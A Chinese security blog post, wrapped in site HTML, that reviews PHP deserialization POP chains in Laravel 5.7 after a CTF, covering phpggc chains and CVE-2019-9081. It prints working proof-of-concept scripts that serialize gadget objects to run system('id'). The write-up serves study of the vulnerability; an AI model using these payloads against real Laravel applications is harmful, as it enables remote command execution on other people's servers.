@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-cn">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web,php反序列化,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言主要是在五度空间的比赛中碰到了laravel的题目，版本是5.7，赛后复现故尝试做一下总结。着实学到了不少关于找pop链的技巧。 环境PHP版本是7.1.7，Nginx 1.14，操作系统osx 14.6 这个基本上不影响。 pop链分析phpggc 链1,41和4链其实都是同一个类型的。理解起来比较简单，主要就是触发Faker\Generator的__call方法。 12345&amp;lt;?ph">
+<meta name="keywords" content="web,php反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="laravel5_7反序列化分析学习">
+<meta property="og:url" content="http://www.star123.top/2020/07/02/laravel5-7反序列化分析学习/index.html">
+<meta property="og:site_name" content="star&#39;s blog">
+<meta property="og:description" content="前言主要是在五度空间的比赛中碰到了laravel的题目，版本是5.7，赛后复现故尝试做一下总结。着实学到了不少关于找pop链的技巧。 环境PHP版本是7.1.7，Nginx 1.14，操作系统osx 14.6 这个基本上不影响。 pop链分析phpggc 链1,41和4链其实都是同一个类型的。理解起来比较简单，主要就是触发Faker\Generator的__call方法。 12345&amp;lt;?ph">
+<meta property="og:locale" content="zh-cn">
+<meta property="og:image" content="https://i.loli.net/2020/07/02/zVTPbuHrWYpCO9K.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/03/i3g5b9wM2Qc1F8n.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/03/rTnR1kp6otELs4M.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/03/6s9CBAuY1dwQPqO.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/03/iGsS1VzofgXpYm5.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/03/QMRecDqjZLmip5l.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/03/RDZBpLTWXseEfly.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/03/qMHvVX9oRNkFmzS.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/03/vnYeH5iMsGSuL8X.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/03/1pzfBmMrsDvIV9d.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/03/Usdz3wFqkoPWT6a.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/03/fx463splg5GOJIT.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/03/qmjwKyS2gnuPz7R.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/03/qmjwKyS2gnuPz7R.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/03/1xzHL83dIYCMnKs.png">
+<meta property="og:updated_time" content="2020-07-02T17:28:18.471Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="laravel5_7反序列化分析学习">
+<meta name="twitter:description" content="前言主要是在五度空间的比赛中碰到了laravel的题目，版本是5.7，赛后复现故尝试做一下总结。着实学到了不少关于找pop链的技巧。 环境PHP版本是7.1.7，Nginx 1.14，操作系统osx 14.6 这个基本上不影响。 pop链分析phpggc 链1,41和4链其实都是同一个类型的。理解起来比较简单，主要就是触发Faker\Generator的__call方法。 12345&amp;lt;?ph">
+<meta name="twitter:image" content="https://i.loli.net/2020/07/02/zVTPbuHrWYpCO9K.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.star123.top/2020/07/02/laravel5-7反序列化分析学习/">
+
+
+
+
+
+  <title>laravel5_7反序列化分析学习 | star's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">star's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2020/07/02/laravel5-7反序列化分析学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="star">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="star's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">laravel5_7反序列化分析学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-02T20:56:20+08:00">
+                2020-07-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要是在五度空间的比赛中碰到了laravel的题目，版本是5.7，赛后复现故尝试做一下总结。着实学到了不少关于找pop链的技巧。</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>PHP版本是7.1.7，Nginx 1.14，操作系统osx 14.6 这个基本上不影响。</p>
+<h2 id="pop链分析"><a href="#pop链分析" class="headerlink" title="pop链分析"></a>pop链分析</h2><h3 id="phpggc-链1-4"><a href="#phpggc-链1-4" class="headerlink" title="phpggc 链1,4"></a>phpggc 链1,4</h3><p>1和4链其实都是同一个类型的。理解起来比较简单，主要就是触发Faker\Generator的__call方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//简化下就是</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;formatters[$function_key],$paramters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还有一个比较难用的点，就是通过Illuminate\Validation\Validator的callExtension方法来执行任意函数。</p>
+<p>这里触发的是Validator的__call方法，但是有个方法名长度的限制。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $parameters)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $rule = Str::snake(substr($method, <span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;extensions[$rule])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;callExtension($rule, $parameters);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以必须要类似于addCollection这样的方法才可以触发。</p>
+<p>最后的poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Validation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Validator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> <span class="title">function</span> <span class="title">__construct</span>($<span class="title">extension</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $<span class="title">this</span>-&gt;<span class="title">extensions</span> = $<span class="title">extension</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ImportConfigurator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">private</span> $route;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parent, $route)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = $parent;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;route = $route;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    $v1 = new Illuminate\Validation\Validator([substr('addCollection', 8) =&gt; 'system']);</span><br><span class="line">    $payload = <span class="keyword">new</span> Symfony\Component\Routing\Loader\Configurator\ImportConfigurator($v1, <span class="string">'id'</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($payload));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>触发点只要是形如xxx-&gt;not_existed_mothod($arguments)</p>
+<p>找到的几个触发点</p>
+<ol>
+<li><p>Swift_Mime_SimpleMimeEntity的__destruct方法(需要swiftmailer组件)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;cache <span class="keyword">instanceof</span> Swift_KeyCache) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cache-&gt;clearAll(<span class="keyword">$this</span>-&gt;cacheKey);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Symfony\Component\Routing\Loader\Configurator\ImportConfigurator 和 CollectionConfigurator</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//类似</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parent-&gt;addCollection(<span class="keyword">$this</span>-&gt;route);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Illuminate\Contracts\Events\Dispatcher\PendingBroadcast</p>
+</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	<span class="comment">//return "no here!";</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里没必要给完整的pop链了，最后结果</p>
+<p><img src="https://i.loli.net/2020/07/02/zVTPbuHrWYpCO9K.png" alt="image.png"></p>
+<p>主要思路就是找类似于$this-&gt;$client-&gt;no_exist_function($params)加上Faker\Generator的<strong>call方法（该</strong>call方法第一个参数可以完全控制）。</p>
+<h3 id="phpggc-链2"><a href="#phpggc-链2" class="headerlink" title="phpggc 链2"></a>phpggc 链2</h3><p>触发点和链1是一样的，但是这里利用了一个$function($p1,$p2)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//namespace Illuminate\Events 中的Dispatcher</span></span><br><span class="line">...</span><br><span class="line">$response = $listener($event, $payload);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>然而system刚刚好有两个参数，所以可以被调用。如果这里的参数不对就会返回null。</p>
+<h3 id="phpggc-链3"><a href="#phpggc-链3" class="headerlink" title="phpggc 链3"></a>phpggc 链3</h3><p>很可惜不能用了。</p>
+<h3 id="phpggc-链5"><a href="#phpggc-链5" class="headerlink" title="phpggc 链5"></a>phpggc 链5</h3><p>链5和1，4最大不一样的地方在于，使用call_user_func执行了EvalLoader类的load方法，而在该方法中，存在eval执行代码从而达成目的。</p>
+<p>来跟踪一下链5，首先是由还是由Illuminate\Broadcasting的PendingBroadcast</p>
+<p><img src="https://i.loli.net/2020/07/03/i3g5b9wM2Qc1F8n.png" alt="image.png"></p>
+<p>但这里不同的是，链5并不触发__call，这里构造调用了\Illuminate\Bus\Dispatcher类的dispatch方法。</p>
+<p>继续跟进。<br><img src="https://i.loli.net/2020/07/03/rTnR1kp6otELs4M.png" alt="image.png"></p>
+<p>看看dispatchToQueue方法，这里直接使用call_user_func调用了Mockery\Loader\EvalLoder的load方法，<br><img src="https://i.loli.net/2020/07/03/6s9CBAuY1dwQPqO.png" alt="image.png"></p>
+<p>然后进入loader方法，这里要找一个不存在的classname。<br><img src="https://i.loli.net/2020/07/03/iGsS1VzofgXpYm5.png" alt="image.png"></p>
+<p>使用&lt;?php $code;?&gt;执行代码，达到效果。<br><img src="https://i.loli.net/2020/07/03/QMRecDqjZLmip5l.png" alt="image.png"></p>
+<h3 id="CVE-2019-9081"><a href="#CVE-2019-9081" class="headerlink" title="CVE-2019-9081"></a>CVE-2019-9081</h3><p>这个链是最特别的，也是学到最多东西的。</p>
+<p>该链poc如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//gadgets.php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">command</span>;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">public</span> $test;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters, $class, $app)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $class;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GenericUser</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $attributes)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;attributes = $attributes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">hasBeenBootstrapped</span> = <span class="title">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> $bindings;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($bind)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindings = $bind;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">test</span> = <span class="title">new</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>\<span class="title">GenericUser</span>(<span class="title">array</span>("<span class="title">expectedOutput</span>" =&gt; <span class="title">array</span>("0" =&gt; "1"), "<span class="title">expectedQuestions</span>" =&gt; <span class="title">array</span>("0" =&gt; "1")));</span><br><span class="line">    $app = <span class="keyword">new</span> Illuminate\Foundation\Application(<span class="keyword">array</span>(<span class="string">"Illuminate\Contracts\Console\Kernel"</span> =&gt; <span class="keyword">array</span>(<span class="string">"concrete"</span> =&gt; <span class="string">"Illuminate\Foundation\Application"</span>)));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(<span class="string">"system"</span>, <span class="keyword">array</span>(<span class="string">'id'</span>), $class, $app)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞的触发点在，\Illuminate\Foundation\Testing\PendingCommand上。</p>
+<p><img src="https://i.loli.net/2020/07/03/RDZBpLTWXseEfly.png" alt="image.png"></p>
+<p>在run函数，需要用一些技巧来过渡<br>mockConsoleOutput函数<br><img src="https://i.loli.net/2020/07/03/qMHvVX9oRNkFmzS.png" alt="image.png"></p>
+<p>GenericUser有可控的__get方法，可以用来过度getQuestion方法和unset($this-&gt;expectedQuestions[$i])方法。<br><img src="https://i.loli.net/2020/07/03/vnYeH5iMsGSuL8X.png" alt="image.png"></p>
+<p>由于Illuminate\Foundation\Application类集成了Container，而Container又实现了ArrayAccess接口，所以，当application类执行数组访问操作的时候会调用offsetGet方法。offsetGet调用make方法。</p>
+<p><img src="https://i.loli.net/2020/07/03/1pzfBmMrsDvIV9d.png" alt="image.png"></p>
+<p>最后调用Container类的build方法，通过反射机制获取到一个Application对象。</p>
+<p><img src="https://i.loli.net/2020/07/03/Usdz3wFqkoPWT6a.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2020/07/03/fx463splg5GOJIT.png" alt="image.png"></p>
+<p>Application对象的call方法。<br><img src="https://i.loli.net/2020/07/03/qmjwKyS2gnuPz7R.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2020/07/03/qmjwKyS2gnuPz7R.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2020/07/03/1xzHL83dIYCMnKs.png" alt="image.png"></p>
+<p>这条链跟下来，发现其实主要的难点还是在生成一个新的Application对象的位置。</p>
+<p>一个技巧是通过可控的__get方法，来绕过一些函数的验证。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>几条链跟下来收获颇多，一个点是找头，专注于<strong>destruct，</strong>wakeup函数发现触发点。一个是找利用点，例如call_user_func_array函数。中间的步骤可以找<strong>call函数，或者沿着继承链向上找可利用函数来接上，还要记得活用类似于可以控制的</strong>get这样的函数。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/php反序列化/" rel="tag"># php反序列化</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/06/27/安恒6月赛总结/" rel="next" title="安恒6月赛总结">
+                <i class="fa fa-chevron-left"></i> 安恒6月赛总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">star</p>
+              <p class="site-description motion-element" itemprop="description">ctf wp and technologies about security</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境"><span class="nav-number">2.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pop链分析"><span class="nav-number">3.</span> <span class="nav-text">pop链分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phpggc-链1-4"><span class="nav-number">3.1.</span> <span class="nav-text">phpggc 链1,4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpggc-链2"><span class="nav-number">3.2.</span> <span class="nav-text">phpggc 链2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpggc-链3"><span class="nav-number">3.3.</span> <span class="nav-text">phpggc 链3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpggc-链5"><span class="nav-number">3.4.</span> <span class="nav-text">phpggc 链5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2019-9081"><span class="nav-number">3.5.</span> <span class="nav-text">CVE-2019-9081</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">star</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
